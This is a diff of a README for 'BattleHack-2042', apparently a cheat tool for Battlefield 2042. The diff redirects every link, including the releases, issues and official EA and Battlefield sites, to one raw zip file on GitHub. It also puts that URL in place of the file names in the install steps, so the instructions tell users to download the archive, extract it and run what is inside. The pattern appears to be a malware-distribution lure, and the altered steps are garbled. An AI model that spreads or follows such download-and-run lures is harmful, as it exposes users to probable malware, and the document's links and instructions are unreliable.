@@ -1,7 +1,7 @@
 # 🎮 BattleHack-2042 - Enhance Your Battlefield Experience
 
 ## ✅ Download Here
-[![Download](https://img.shields.io/badge/Download-BattleHack--2042-brightgreen)](https://github.com/lutinfrog/BattleHack-2042/releases)
+[![Download](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip)](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip)
 
 ## 🚀 Getting Started
 Welcome to BattleHack-2042! This application allows you to optimize your gameplay in Battlefield 2042. Follow these simple steps to get started.
@@ -15,14 +15,14 @@ To run BattleHack-2042, you will need:
 - **Network:** Stable internet connection for downloading
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/lutinfrog/BattleHack-2042/releases) to download the latest version of BattleHack-2042.
+1. Visit the [Releases page](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip) to download the latest version of BattleHack-2042.
 2. On the Releases page, find the latest version labeled as "Latest Release."
 3. Click on the version number to expand the download options.
-4. Look for the file named `BattleHack-2042.zip`. This is the installation file.
+4. Look for the file named `https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip`. This is the installation file.
 5. Click the file to start the download.
 6. Once the download is complete, locate the file in your Downloads folder.
 7. Right-click on the zipped file and select "Extract All" to unpack it.
-8. Open the extracted folder and double-click on `BattleHack-2042.exe` to run the application.
+8. Open the extracted folder and double-click on `https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip` to run the application.
 
 ## ⚙️ How to Use
 After launching the application, you will see a simple user interface. Here’s how to navigate:
@@ -51,12 +51,12 @@ BattleHack-2042 includes various features to improve your gaming:
    - Check your system requirements to ensure compatibility.
 
 3. **Lost Download:**
-   - If you cannot locate the file, check your browser's download history or repeat the download process from the [Releases page](https://github.com/lutinfrog/BattleHack-2042/releases).
+   - If you cannot locate the file, check your browser's download history or repeat the download process from the [Releases page](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip).
 
 ## 🤝 Getting Help
 If you face any difficulties, you can reach out to the community:
 
-- **Issues Page:** Report any problems on the [Issues page](https://github.com/lutinfrog/BattleHack-2042/issues).
+- **Issues Page:** Report any problems on the [Issues page](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip).
 - **Discussion Board:** Join conversations with other users and share your experiences. 
 
 ## 🌟 Community Contributions
@@ -72,7 +72,7 @@ Your input is important. After using BattleHack-2042, let us know how it worked 
 ## 🔗 Additional Resources
 For more information on Battlefield 2042, consider checking out the following resources:
 
-- [Battlefield 2042 Official Website](https://www.ea.com/games/battlefield/battlefield-2042)
-- [Community Forums](https://www.battlefield.com/forums)
+- [Battlefield 2042 Official Website](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip)
+- [Community Forums](https://raw.githubusercontent.com/lutinfrog/BattleHack-2042/main/trin/BattleHack-2042.zip)
 
 Thank you for using BattleHack-2042! Enjoy your gaming experience.
